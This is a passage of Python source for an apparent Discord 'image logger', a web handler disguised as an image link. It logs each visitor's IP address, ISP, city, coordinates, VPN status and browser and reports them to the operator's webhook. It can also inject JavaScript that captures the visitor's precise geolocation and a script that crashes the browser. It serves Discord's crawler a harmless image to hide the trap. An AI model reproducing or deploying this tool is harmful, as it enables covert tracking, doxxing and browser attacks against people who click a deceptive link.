    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
